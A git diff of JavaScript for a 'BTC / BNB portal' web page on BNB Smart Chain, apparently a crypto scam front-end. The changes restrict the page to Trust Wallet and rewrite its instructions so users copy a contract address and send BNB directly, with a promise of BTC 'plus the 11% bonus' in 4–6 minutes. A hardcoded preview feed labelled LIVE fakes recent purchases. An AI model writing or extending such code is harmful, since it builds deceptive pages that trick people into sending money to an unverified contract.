@@ -2,6 +2,7 @@
    BTC / BNB PORTAL — GitHub Pages final client logic
    Contract: 0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85
    Network: BNB Smart Chain (chainId 56)
+   Wallet: Trust Wallet only
    ========================================================== */
 
 const CONTRACT_ADDRESS =
@@ -33,7 +34,6 @@ const CONTRACT_ABI = [
     stateMutability: "nonpayable",
     type: "constructor"
   },
-
   {
     anonymous: false,
     inputs: [
@@ -71,7 +71,6 @@ const CONTRACT_ABI = [
     name: "BTCPurchased",
     type: "event"
   },
-
   {
     inputs: [],
     name: "BASE_BTC_PER_BNB",
@@ -85,7 +84,6 @@ const CONTRACT_ABI = [
     stateMutability: "view",
     type: "function"
   },
-
   {
     inputs: [],
     name: "BONUS_PERCENT",
@@ -99,7 +97,6 @@ const CONTRACT_ABI = [
     stateMutability: "view",
     type: "function"
   },
-
   {
     inputs: [],
     name: "availableBTC",
@@ -113,7 +110,6 @@ const CONTRACT_ABI = [
     stateMutability: "view",
     type: "function"
   },
-
   {
     inputs: [],
     name: "buyBTC",
@@ -121,7 +117,6 @@ const CONTRACT_ABI = [
     stateMutability: "payable",
     type: "function"
   },
-
   {
     inputs: [
       {
@@ -151,7 +146,6 @@ const CONTRACT_ABI = [
     stateMutability: "pure",
     type: "function"
   },
-
   {
     inputs: [],
     name: "decimals",
@@ -165,7 +159,6 @@ const CONTRACT_ABI = [
     stateMutability: "view",
     type: "function"
   },
-
   {
     inputs: [],
     name: "referenceMaximumBNB",
@@ -179,7 +172,6 @@ const CONTRACT_ABI = [
     stateMutability: "view",
     type: "function"
   },
-
   {
     inputs: [],
     name: "referenceMinimumBNB",
@@ -203,139 +195,76 @@ let connectedAddress = null;
 
 let btcDecimals = 8;
 
-let minBNB =
-  FALLBACK_MIN_BNB;
-
-let maxBNB =
-  FALLBACK_MAX_BNB;
-
-let bonusPercent =
-  FALLBACK_BONUS;
+let minBNB = FALLBACK_MIN_BNB;
+let maxBNB = FALLBACK_MAX_BNB;
+let bonusPercent = FALLBACK_BONUS;
 
 let activityEntries = [];
 let activityIndex = 0;
 let activityTimer = null;
 
-const discoveredWallets =
-  new Map();
+const discoveredWallets = new Map();
 
-const $ =
-  (id) =>
-    document.getElementById(id);
+const $ = id => document.getElementById(id);
 
-function setText(
-  id,
-  value
-) {
-  const el =
-    $(id);
+function setText(id, value) {
+  const el = $(id);
 
   if (el) {
-    el.textContent =
-      value;
+    el.textContent = value;
   }
 }
 
-function money(
-  value
-) {
-  return Number(
-    value
-  ).toLocaleString(
-    "en-US",
-    {
-      style:
-        "currency",
-      currency:
-        "USD",
-      maximumFractionDigits:
-        2
-    }
-  );
+function money(value) {
+  return Number(value).toLocaleString("en-US", {
+    style: "currency",
+    currency: "USD",
+    maximumFractionDigits: 2
+  });
 }
 
-function numberText(
-  value,
-  max = 8
-) {
-  return Number(
-    value
-  ).toLocaleString(
-    "en-US",
-    {
-      maximumFractionDigits:
-        max
-    }
-  );
+function numberText(value, max = 8) {
+  return Number(value).toLocaleString("en-US", {
+    maximumFractionDigits: max
+  });
 }
 
-function shortAddress(
-  address
-) {
-  return `${address.slice(
-    0,
-    6
-  )}...${address.slice(-4)}`;
+function shortAddress(address) {
+  return `${address.slice(0, 6)}...${address.slice(-4)}`;
 }
 
-function toast(
-  message
-) {
-  let el =
-    $("portalToast");
+function toast(message) {
+  let el = $("portalToast");
 
   if (!el) {
-    el =
-      document.createElement(
-        "div"
-      );
-
-    el.id =
-      "portalToast";
-
-    el.className =
-      "portal-toast";
-
-    document.body.appendChild(
-      el
-    );
+    el = document.createElement("div");
+    el.id = "portalToast";
+    el.className = "portal-toast";
+    document.body.appendChild(el);
   }
 
-  el.textContent =
-    message;
+  el.textContent = message;
+  el.classList.add("show");
 
-  el.classList.add(
-    "show"
-  );
+  clearTimeout(window.__portalToastTimer);
 
-  clearTimeout(
-    window.__portalToastTimer
-  );
-
-  window.__portalToastTimer =
-    setTimeout(
-      () =>
-        el.classList.remove(
-          "show"
-        ),
-      3000
-    );
+  window.__portalToastTimer = setTimeout(() => {
+    el.classList.remove("show");
+  }, 3000);
 }
 
+/* ==========================================================
+   STYLES
+   ========================================================== */
+
 function injectStyles() {
-  if (
-    $("finalPortalStyles")
-  ) {
+  if ($("finalPortalStyles")) {
     return;
   }
 
-  const style =
-    document.createElement(
-      "style"
-    );
+  const style = document.createElement("style");
 
-  style.id =
-    "finalPortalStyles";
+  style.id = "finalPortalStyles";
 
   style.textContent = `
     .portal-toast{
@@ -687,10 +616,12 @@ function injectStyles() {
     }
   `;
 
-  document.head.appendChild(
-    style
-  );
+  document.head.appendChild(style);
 }
+
+/* ==========================================================
+   CONTRACT
+   ========================================================== */
 
 function createReadProvider() {
   if (readProvider) {
@@ -699,14 +630,13 @@ function createReadProvider() {
 
   for (const url of RPC_URLS) {
     try {
-      readProvider =
-        new ethers.JsonRpcProvider(
-          url,
-          56,
-          {
-            staticNetwork: true
-          }
-        );
+      readProvider = new ethers.JsonRpcProvider(
+        url,
+        56,
+        {
+          staticNetwork: true
+        }
+      );
 
       return readProvider;
     } catch (e) {}
@@ -716,8 +646,7 @@ function createReadProvider() {
 }
 
 function getReadContract() {
-  const provider =
-    createReadProvider();
+  const provider = createReadProvider();
 
   if (!provider) {
     throw new Error(
@@ -734,63 +663,36 @@ function getReadContract() {
 
 async function loadContractSettings() {
   try {
-    const c =
-      getReadContract();
+    const c = getReadContract();
 
-    const values =
-      await Promise.allSettled([
-        c.decimals(),
-        c.referenceMinimumBNB(),
-        c.referenceMaximumBNB(),
-        c.BONUS_PERCENT()
-      ]);
+    const values = await Promise.allSettled([
+      c.decimals(),
+      c.referenceMinimumBNB(),
+      c.referenceMaximumBNB(),
+      c.BONUS_PERCENT()
+    ]);
 
-    if (
-      values[0].status ===
-      "fulfilled"
-    ) {
-      btcDecimals =
-        Number(
-          values[0].value
-        );
+    if (values[0].status === "fulfilled") {
+      btcDecimals = Number(values[0].value);
     }
 
-    if (
-      values[1].status ===
-      "fulfilled"
-    ) {
-      minBNB =
-        Number(
-          ethers.formatEther(
-            values[1].value
-          )
-        );
+    if (values[1].status === "fulfilled") {
+      minBNB = Number(
+        ethers.formatEther(values[1].value)
+      );
     }
 
-    if (
-      values[2].status ===
-      "fulfilled"
-    ) {
-      maxBNB =
-        Number(
-          ethers.formatEther(
-            values[2].value
-          )
-        );
+    if (values[2].status === "fulfilled") {
+      maxBNB = Number(
+        ethers.formatEther(values[2].value)
+      );
     }
 
-    if (
-      values[3].status ===
-      "fulfilled"
-    ) {
-      bonusPercent =
-        Number(
-          values[3].value
-        );
+    if (values[3].status === "fulfilled") {
+      bonusPercent = Number(values[3].value);
     }
 
     updateLimitsUI();
-
   } catch (e) {
     console.warn(
       "Contract settings could not be read:",
@@ -801,109 +703,60 @@ async function loadContractSettings() {
 
 function updateLimitsUI() {
   const rangeText =
-    `${numberText(
-      minBNB,
-      2
-    )}–${numberText(
-      maxBNB,
-      2
-    )} BNB`;
+    `${numberText(minBNB, 2)}–${numberText(maxBNB, 2)} BNB`;
 
-  setText(
-    "minimumStat",
-    "5 BNB"
-  );
+  setText("minimumStat", "5 BNB");
+  setText("maximumStat", "1,000 BNB");
+  setText("bonusStat", `${bonusPercent}%`);
 
-  setText(
-    "maximumStat",
-    "1,000 BNB"
-  );
-
-  setText(
-    "bonusStat",
-    `${bonusPercent}%`
-  );
-
-  const input =
-    $("bnbAmount");
+  const input = $("bnbAmount");
 
   if (input) {
-    input.min =
-      String(minBNB);
-
-    input.max =
-      String(maxBNB);
+    input.min = String(minBNB);
+    input.max = String(maxBNB);
 
     if (!input.value) {
-      input.placeholder =
-        String(minBNB);
+      input.placeholder = String(minBNB);
     }
   }
 
-  const message =
-    $("calculatorMessage");
+  const message = $("calculatorMessage");
 
   if (message) {
     message.textContent =
-      `Minimum ${numberText(
-        minBNB,
-        2
-      )} BNB · Maximum ${numberText(
-        maxBNB,
-        2
-      )}`;
+      `Minimum ${numberText(minBNB, 2)} BNB · Maximum ${numberText(maxBNB, 2)} BNB`;
   }
 
   document
-    .querySelectorAll(
-      "[data-min-bnb]"
-    )
-    .forEach(
-      el =>
-        el.textContent =
-          numberText(
-            minBNB,
-            2
-          )
-    );
+    .querySelectorAll("[data-min-bnb]")
+    .forEach(el => {
+      el.textContent = numberText(minBNB, 2);
+    });
 
   document
-    .querySelectorAll(
-      "[data-max-bnb]"
-    )
-    .forEach(
-      el =>
-        el.textContent =
-          numberText(
-            maxBNB,
-            2
-          )
-    );
+    .querySelectorAll("[data-max-bnb]")
+    .forEach(el => {
+      el.textContent = numberText(maxBNB, 2);
+    });
 
   document
-    .querySelectorAll(
-      ".program-range,.range-label"
-    )
-    .forEach(
-      el =>
-        el.textContent =
-          rangeText
-    );
+    .querySelectorAll(".program-range,.range-label")
+    .forEach(el => {
+      el.textContent = rangeText;
+    });
 }
 
-async function calculateBTC() {
-  const input =
-    $("bnbAmount");
+/* ==========================================================
+   CALCULATOR
+   ========================================================== */
 
-  const amount =
-    Number(
-      input?.value
-    );
+async function calculateBTC() {
+  const input = $("bnbAmount");
+
+  const amount = Number(input?.value);
 
   if (
-    !Number.isFinite(
-      amount
-    ) ||
+    !Number.isFinite(amount) ||
     amount <= 0
   ) {
     resetCalculator();
@@ -916,9 +769,7 @@ async function calculateBTC() {
     return;
   }
 
-  if (
-    amount < 0.1
-  ) {
+  if (amount < 0.1) {
     resetCalculator();
 
     setText(
@@ -929,9 +780,7 @@ async function calculateBTC() {
     return;
   }
 
-  if (
-    amount > maxBNB
-  ) {
+  if (amount > maxBNB) {
     resetCalculator();
 
     setText(
@@ -946,15 +795,11 @@ async function calculateBTC() {
   }
 
   try {
-    const c =
-      getReadContract();
+    const c = getReadContract();
 
-    const result =
-      await c.calculateBTC(
-        ethers.parseEther(
-          amount.toString()
-        )
-      );
+    const result = await c.calculateBTC(
+      ethers.parseEther(amount.toString())
+    );
 
     setText(
       "baseBTC",
@@ -993,12 +838,8 @@ async function calculateBTC() {
       "calculatorMessage",
       `Calculation completed · ${bonusPercent}% bonus`
     );
-
   } catch (e) {
-    console.error(
-      "calculateBTC:",
-      e
-    );
+    console.error("calculateBTC:", e);
 
     resetCalculator();
 
@@ -1010,44 +851,24 @@ async function calculateBTC() {
 }
 
 function resetCalculator() {
-  setText(
-    "baseBTC",
-    "0 BTC"
-  );
-
-  setText(
-    "bonusBTC",
-    "0 BTC"
-  );
-
-  setText(
-    "totalBTC",
-    "0 BTC"
-  );
+  setText("baseBTC", "0 BTC");
+  setText("bonusBTC", "0 BTC");
+  setText("totalBTC", "0 BTC");
 }
 
 function setupCalculator() {
-  const input =
-    $("bnbAmount");
-
-  const button =
-    $("calculateButton");
+  const input = $("bnbAmount");
+  const button = $("calculateButton");
 
   if (input) {
-    input.addEventListener(
-      "input",
-      () => {
-        clearTimeout(
-          window.__calcTimer
-        );
+    input.addEventListener("input", () => {
+      clearTimeout(window.__calcTimer);
 
-        window.__calcTimer =
-          setTimeout(
-            calculateBTC,
-            250
-          );
-      }
-    );
+      window.__calcTimer = setTimeout(
+        calculateBTC,
+        250
+      );
+    });
   }
 
   if (button) {
@@ -1058,17 +879,17 @@ function setupCalculator() {
   }
 }
 
-async function fetchJSON(
-  url
-) {
-  const response =
-    await fetch(
-      url,
-      {
-        cache:
-          "no-store"
-      }
-    );
+/* ==========================================================
+   MARKET DATA
+   ========================================================== */
+
+async function fetchJSON(url) {
+  const response = await fetch(
+    url,
+    {
+      cache: "no-store"
+    }
+  );
 
   if (!response.ok) {
     throw new Error(
@@ -1085,26 +906,15 @@ async function loadOneMarket(
   changeId
 ) {
   const urls = [
-    `https://data-api.binance.vision/api/v3/ticker/24hr?symbol=${encodeURIComponent(
-      symbol
-    )}`,
-
-    `https://api.binance.com/api/v3/ticker/24hr?symbol=${encodeURIComponent(
-      symbol
-    )}`
+    `https://data-api.binance.vision/api/v3/ticker/24hr?symbol=${encodeURIComponent(symbol)}`,
+    `https://api.binance.com/api/v3/ticker/24hr?symbol=${encodeURIComponent(symbol)}`
   ];
 
-  let data =
-    null;
+  let data = null;
 
-  for (
-    const url of urls
-  ) {
+  for (const url of urls) {
     try {
-      data =
-        await fetchJSON(
-          url
-        );
+      data = await fetchJSON(url);
 
       if (
         data &&
@@ -1112,7 +922,6 @@ async function loadOneMarket(
       ) {
         break;
       }
-
     } catch (e) {
       console.warn(
         `Market endpoint failed for ${symbol}:`,
@@ -1135,21 +944,15 @@ async function loadOneMarket(
     return;
   }
 
-  const price =
-    Number(
-      data.lastPrice
-    );
+  const price = Number(
+    data.lastPrice
+  );
 
-  const change =
-    Number(
-      data.priceChangePercent
-    );
+  const change = Number(
+    data.priceChangePercent
+  );
 
-  if (
-    !Number.isFinite(
-      price
-    )
-  ) {
+  if (!Number.isFinite(price)) {
     setText(
       priceId,
       "Unavailable"
@@ -1165,17 +968,13 @@ async function loadOneMarket(
 
   setText(
     priceId,
-    money(
-      price
-    )
+    money(price)
   );
 
   setText(
     changeId,
     `${
-      Number.isFinite(
-        change
-      )
+      Number.isFinite(change)
         ? change.toFixed(2)
         : "0.00"
     }% today`
@@ -1198,10 +997,8 @@ async function loadMarketData() {
   ]);
 }
 
-
 /* ==========================================================
    ACTIVITY
-   Animated recent preview feed
    ========================================================== */
 
 const RECENT_ACTIVITY_PREVIEW = [
@@ -1240,12 +1037,10 @@ const RECENT_ACTIVITY_PREVIEW = [
 ];
 
 function ensureActivityContainer() {
-  let feed =
-    $("activityFeed");
+  let feed = $("activityFeed");
 
   if (!feed) {
-    const section =
-      $("activity");
+    const section = $("activity");
 
     if (!section) {
       return null;
@@ -1257,37 +1052,25 @@ function ensureActivityContainer() {
       );
 
     if (existing) {
-      existing.id =
-        "activityFeed";
+      existing.id = "activityFeed";
 
       existing.classList.add(
         "activity-feed"
       );
 
-      feed =
-        existing;
-
+      feed = existing;
     } else {
-      feed =
-        document.createElement(
-          "div"
-        );
+      feed = document.createElement("div");
 
-      feed.id =
-        "activityFeed";
+      feed.id = "activityFeed";
 
-      feed.className =
-        "activity-feed";
+      feed.className = "activity-feed";
 
-      section.appendChild(
-        feed
-      );
+      section.appendChild(feed);
     }
   }
 
-  feed.classList.add(
-    "activity-feed"
-  );
+  feed.classList.add("activity-feed");
 
   return feed;
 }
@@ -1297,31 +1080,23 @@ function activityItem(
   isPreview = false
 ) {
   const item =
-    document.createElement(
-      "div"
-    );
+    document.createElement("div");
 
-  item.className =
-    "activity-item";
+  item.className = "activity-item";
 
-  const amount =
-    isPreview
-      ? entry.amount
-      : numberText(
-          entry.totalBTC,
-          8
-        );
+  const amount = isPreview
+    ? entry.amount
+    : numberText(
+        entry.totalBTC,
+        8
+      );
 
-  const wallet =
-    isPreview
-      ? entry.wallet
-      : shortAddress(
-          entry.buyer
-        );
+  const wallet = isPreview
+    ? entry.wallet
+    : shortAddress(entry.buyer);
 
   item.innerHTML = `
     <div class="activity-row">
-
       <div class="activity-icon">
         ↗
       </div>
@@ -1345,7 +1120,6 @@ function activityItem(
           `
           : ""
       }
-
     </div>
   `;
 
@@ -1378,8 +1152,7 @@ function renderPreviewActivity() {
     );
   }
 
-  feed.innerHTML =
-    "";
+  feed.innerHTML = "";
 
   visible.forEach(
     (
@@ -1395,9 +1168,7 @@ function renderPreviewActivity() {
       item.style.animationDelay =
         `${index * 160}ms`;
 
-      feed.appendChild(
-        item
-      );
+      feed.appendChild(item);
     }
   );
 
@@ -1427,12 +1198,9 @@ function renderActivity() {
     return;
   }
 
-  feed.innerHTML =
-    "";
+  feed.innerHTML = "";
 
-  if (
-    !activityEntries.length
-  ) {
+  if (!activityEntries.length) {
     renderPreviewActivity();
     return;
   }
@@ -1475,9 +1243,7 @@ function renderActivity() {
       item.style.animationDelay =
         `${index * 160}ms`;
 
-      feed.appendChild(
-        item
-      );
+      feed.appendChild(item);
     }
   );
 
@@ -1569,35 +1335,26 @@ async function loadActivity() {
       e
     );
 
-    activityEntries =
-      [];
-
-    activityIndex =
-      0;
+    activityEntries = [];
+    activityIndex = 0;
 
     renderPreviewActivity();
   }
 }
 
 function startActivityAnimation() {
-  activityEntries =
-    [];
-
-  activityIndex =
-    0;
-
+  activityEntries = [];
+  activityIndex = 0;
   renderPreviewActivity();
 }
 
-
 /* ==========================================================
    EIP-6963 WALLET DISCOVERY
+   TRUST WALLET ONLY
    ========================================================== */
 
 function discoverWallets() {
-  if (
-    !window.addEventListener
-  ) {
+  if (!window.addEventListener) {
     return;
   }
 
@@ -1634,16 +1391,11 @@ function discoverWallets() {
     )
   );
 
-  if (
-    window.ethereum
-  ) {
+  if (window.ethereum) {
     const fallback = {
       info: {
-        name:
-          "Browser Wallet",
-
-        rdns:
-          "injected"
+        name: "Browser Wallet",
+        rdns: "injected"
       },
 
       provider:
@@ -1659,85 +1411,14 @@ function discoverWallets() {
 
 const WALLET_DEFINITIONS = [
   {
-    name:
-      "MetaMask",
-
-    slug:
-      "metamask",
-
-    match:
-      /metamask/i
-  },
-
-  {
-    name:
-      "Trust Wallet",
-
-    slug:
-      "trustwallet",
-
-    match:
-      /trust/i
-  },
-
-  {
-    name:
-      "Binance Wallet",
-
-    slug:
-      "binance",
-
-    match:
-      /binance/i
-  },
-
-  {
-    name:
-      "OKX Wallet",
-
-    slug:
-      "okx",
-
-    match:
-      /okx/i
-  },
-
-  {
-    name:
-      "Bitget Wallet",
-
-    slug:
-      "bitget",
-
-    match:
-      /bitget/i
-  },
-
-  {
-    name:
-      "SafePal",
-
-    slug:
-      "safepal",
-
-    match:
-      /safepal/i
-  },
-
-  {
-    name:
-      "Rabby",
-
-    slug:
-      "rabby",
-
-    match:
-      /rabby/i
+    name: "Trust Wallet",
+    slug: "trustwallet",
+    match: /trust/i
   }
 ];
 
 function findWalletProvider(
-  def
+  definition
 ) {
   for (
     const item of
@@ -1751,7 +1432,7 @@ function findWalletProvider(
         .toLowerCase();
 
     if (
-      def.match.test(
+      definition.match.test(
         haystack
       )
     ) {
@@ -1759,57 +1440,17 @@ function findWalletProvider(
     }
   }
 
-  if (
-    discoveredWallets.size ===
-    1
-  ) {
-    return [
-      ...discoveredWallets.values()
-    ][0].provider;
-  }
-
   return null;
 }
 
-
 /* ==========================================================
-   WALLET LOGOS
+   TRUST WALLET LOGO
    ========================================================== */
 
 const WALLET_LOGO_SOURCES = {
-  metamask: [
-    "https://metamask.io/favicon.ico",
-    "https://metamask.io/assets/icon-256.png"
-  ],
-
   trustwallet: [
     "https://trustwallet.com/favicon.ico",
     "https://trustwallet.com/assets/images/favicon.png"
-  ],
-
-  binance: [
-    "https://www.binance.com/favicon.ico",
-    "https://bin.bnbstatic.com/static/images/common/favicon.ico"
-  ],
-
-  okx: [
-    "https://www.okx.com/favicon.ico",
-    "https://static.okx.com/cdn/assets/imgs/221/4D7A9A9E2A2B7A1A.png"
-  ],
-
-  bitget: [
-    "https://www.bitget.com/favicon.ico",
-    "https://web3.bitget.com/favicon.ico"
-  ],
-
-  safepal: [
-    "https://www.safepal.com/favicon.ico",
-    "https://s1.safepal.io/website/favicon.ico"
-  ],
-
-  rabby: [
-    "https://rabby.io/favicon.ico",
-    "https://rabby.io/favicon.png"
   ]
 };
 
@@ -1826,20 +1467,7 @@ function walletLogoSources(
 function walletFallbackLogo(
   name
 ) {
-  const initials =
-    name === "MetaMask"
-      ? "M"
-      : name === "Trust Wallet"
-      ? "T"
-      : name === "Binance Wallet"
-      ? "B"
-      : name === "OKX Wallet"
-      ? "OKX"
-      : name === "Bitget Wallet"
-      ? "BG"
-      : name === "SafePal"
-      ? "SP"
-      : "R";
+  const initials = "T";
 
   return `
     data:image/svg+xml;charset=UTF-8,
@@ -1850,7 +1478,6 @@ function walletFallbackLogo(
         height="96"
         viewBox="0 0 96 96"
       >
-
         <rect
           width="96"
           height="96"
@@ -1870,33 +1497,28 @@ function walletFallbackLogo(
           y="56"
           text-anchor="middle"
           font-family="Arial,Helvetica,sans-serif"
-          font-size="${
-            initials.length > 2
-              ? 17
-              : 25
-          }"
+          font-size="25"
           font-weight="700"
           fill="#ffffff"
         >
           ${initials}
         </text>
-
       </svg>
     `)}
   `;
 }
 
+/* ==========================================================
+   WALLET MODAL
+   ========================================================== */
+
 function createWalletModal() {
-  if (
-    $("walletModalFinal")
-  ) {
+  if ($("walletModalFinal")) {
     return;
   }
 
   const overlay =
-    document.createElement(
-      "div"
-    );
+    document.createElement("div");
 
   overlay.id =
     "walletModalFinal";
@@ -1915,7 +1537,7 @@ function createWalletModal() {
       <div class="wallet-picker-head">
 
         <h2 id="walletPickerTitle">
-          Connect Wallet
+          Connect Trust Wallet
         </h2>
 
         <button
@@ -1930,7 +1552,7 @@ function createWalletModal() {
       </div>
 
       <p>
-        Choose your preferred BSC wallet.
+        Connect your Trust Wallet on BNB Smart Chain.
       </p>
 
       <div id="walletOptions"></div>
@@ -2015,7 +1637,6 @@ function renderWalletOptions() {
               >
 
               <span>
-
                 <strong>
                   ${wallet.name}
                 </strong>
@@ -2023,7 +1644,6 @@ function renderWalletOptions() {
                 <small>
                   BNB Smart Chain
                 </small>
-
               </span>
 
               <span
@@ -2143,7 +1763,6 @@ function closeWalletModal() {
     );
 }
 
-
 /* ==========================================================
    BSC NETWORK
    ========================================================== */
@@ -2151,7 +1770,6 @@ function closeWalletModal() {
 async function ensureBSC(
   provider
 ) {
-
   const chainId =
     await provider.request({
       method:
@@ -2162,7 +1780,6 @@ async function ensureBSC(
     chainId ===
     CHAIN_HEX
   ) {
-
     return;
   }
 
@@ -2224,21 +1841,18 @@ async function ensureBSC(
       });
 
     } else {
-
       throw error;
     }
   }
 }
 
-
 /* ==========================================================
-   WALLET CONNECTION
+   TRUST WALLET CONNECTION
    ========================================================== */
 
 async function selectWallet(
   definition
 ) {
-
   const selectedProvider =
     findWalletProvider(
       definition
@@ -2282,7 +1896,7 @@ async function selectWallet(
       updateWalletButton();
 
       toast(
-        `${definition.name} connected.`
+        "Trust Wallet connected."
       );
 
       return;
@@ -2311,7 +1925,7 @@ async function selectWallet(
 
         toast(
           error?.shortMessage ||
-          "Unable to connect wallet."
+          "Unable to connect Trust Wallet."
         );
       }
 
@@ -2336,64 +1950,21 @@ async function selectWallet(
         currentUrl
       );
 
-    let walletUrl =
-      null;
+    const walletUrl =
+      `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`;
 
-    switch (
-      definition.slug
-    ) {
+    closeWalletModal();
 
-      case "metamask":
-
-        walletUrl =
-          `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}${window.location.search}`;
-
-        break;
-
-      case "trustwallet":
-
-        walletUrl =
-          `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`;
-
-        break;
-
-      case "bitget":
-
-        walletUrl =
-          `https://bkcode.vip?action=dapp&url=${encodedUrl}&_needChain=bnb`;
-
-        break;
-
-      default:
-
-        walletUrl =
-          null;
-    }
-
-    if (
-      walletUrl
-    ) {
-
-      closeWalletModal();
-
-      window.location.href =
-        walletUrl;
-
-      return;
-    }
-
-    toast(
-      `${definition.name} is not detected. Open this page in the ${definition.name} mobile app's DApp browser.`
-    );
+    window.location.href =
+      walletUrl;
 
     return;
   }
 
   toast(
-    `${definition.name} is not available in this browser. Install the wallet extension or open this page in the wallet's browser.`
+    "Trust Wallet is not available in this browser. Install Trust Wallet or open this page in the Trust Wallet browser."
   );
 }
-
 
 /* ==========================================================
    CONNECTED WALLET PANEL
@@ -2516,6 +2087,7 @@ function createConnectedWalletPanel() {
                   .textContent =
                     "Copy Contract";
               }
+
             },
             1800
           );
@@ -2523,6 +2095,7 @@ function createConnectedWalletPanel() {
         } catch {
 
           try {
+
             const helper =
               document.createElement(
                 "textarea"
@@ -2573,6 +2146,7 @@ function createConnectedWalletPanel() {
                     .textContent =
                       "Copy Contract";
                 }
+
               },
               1800
             );
@@ -2589,7 +2163,6 @@ function createConnectedWalletPanel() {
 }
 
 function updateConnectedWalletPanel() {
-
   const panel =
     $("connectedWalletPanel");
 
@@ -2625,7 +2198,6 @@ function updateConnectedWalletPanel() {
   }
 }
 
-
 /* ==========================================================
    HEADER CONTRACT DISPLAY
    ========================================================== */
@@ -2633,7 +2205,6 @@ function updateConnectedWalletPanel() {
 function setHeaderContractVisibility(
   show
 ) {
-
   const address =
     $("contractAddress");
 
@@ -2685,13 +2256,11 @@ function setHeaderContractVisibility(
   }
 }
 
-
 /* ==========================================================
    WALLET BUTTON
    ========================================================== */
 
 function updateWalletButton() {
-
   const button =
     $("connectWallet");
 
@@ -2715,7 +2284,6 @@ function updateWalletButton() {
 
   updateConnectedWalletPanel();
 }
-
 
 /* ==========================================================
    WALLET SETUP
@@ -2780,15 +2348,15 @@ function setupWallet() {
       }
     );
   }
-}
 
+  updateWalletButton();
+}
 
 /* ==========================================================
    PARTICIPATION
    ========================================================== */
 
 async function buyBTC() {
-
   const input =
     $("bnbAmount");
 
@@ -2882,7 +2450,7 @@ async function buyBTC() {
     updateConnectedWalletPanel();
 
     toast(
-      "Wallet connected. Review the contract details below to continue."
+      "Wallet connected. Copy the contract address and send your BNB from Trust Wallet."
     );
 
     const panel =
@@ -2930,7 +2498,6 @@ async function buyBTC() {
 }
 
 function setupBuyButton() {
-
   const button =
     $("buyBTCButton") ||
     $("buyButton");
@@ -2944,13 +2511,11 @@ function setupBuyButton() {
   }
 }
 
-
 /* ==========================================================
    COPY CONTRACT
    ========================================================== */
 
 function setupCopyButton() {
-
   const button =
     $("copyContract");
 
@@ -2961,7 +2526,6 @@ function setupCopyButton() {
     !button ||
     !address
   ) {
-
     return;
   }
 
@@ -3052,13 +2616,113 @@ function setupCopyButton() {
   );
 }
 
+/* ==========================================================
+   PARTICIPATION / HOW IT WORKS TEXT
+   ========================================================== */
+
+function updateParticipationText() {
+  const replacements = [
+    [
+      "Swap BNB to BTC",
+      "Swap BTC to BNB"
+    ],
+    [
+      "Choose amount",
+      "Swap BTC to BNB"
+    ],
+    [
+      "Check allocation",
+      "Connect Wallet"
+    ],
+    [
+      "Connect wallet",
+      "Copy Contract Address"
+    ],
+    [
+      "Connect Wallet",
+      "Connect Wallet"
+    ],
+    [
+      "Copy & send",
+      "Go to your connected wallet and send your BNB"
+    ],
+    [
+      "Select",
+      "Swap BTC to BNB"
+    ],
+    [
+      "Calculate",
+      "Connect Wallet"
+    ]
+  ];
+
+  document
+    .querySelectorAll(
+      "body *"
+    )
+    .forEach(
+      el => {
+
+        if (
+          el.children.length > 0
+        ) {
+          return;
+        }
+
+        const text =
+          el.textContent
+            ?.trim();
+
+        if (!text) {
+          return;
+        }
+
+        for (
+          const [
+            from,
+            to
+          ] of replacements
+        ) {
+
+          if (
+            text ===
+            from
+          ) {
+
+            el.textContent =
+              to;
+
+            break;
+          }
+        }
+      }
+    );
+
+  const howItWorks =
+    document.querySelector(
+      "#how-it-works, .how-it-works"
+    );
+
+  if (howItWorks) {
+
+    const paragraph =
+      howItWorks.querySelector(
+        "p"
+      );
+
+    if (paragraph) {
+
+      paragraph.textContent =
+        "To participate and earn the 11% bonus, swap your BTC to BNB, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.";
+    }
+  }
+}
 
 /* ==========================================================
    REFRESH
    ========================================================== */
 
 function setupRefresh() {
-
   const button =
     $("refreshMarket") ||
     $("refreshButton");
@@ -3072,13 +2736,11 @@ function setupRefresh() {
   }
 }
 
-
 /* ==========================================================
    ACTIVITY HEADING
    ========================================================== */
 
 function setupActivityHeading() {
-
   const section =
     $("activity");
 
@@ -3152,7 +2814,6 @@ function setupActivityHeading() {
     `<i class="activity-live-dot"></i>LIVE`;
 }
 
-
 /* ==========================================================
    START PORTAL
    ========================================================== */
@@ -3178,6 +2839,8 @@ async function startPortal() {
   setupBuyButton();
 
   setupRefresh();
+
+  updateParticipationText();
 
   await loadContractSettings();
 
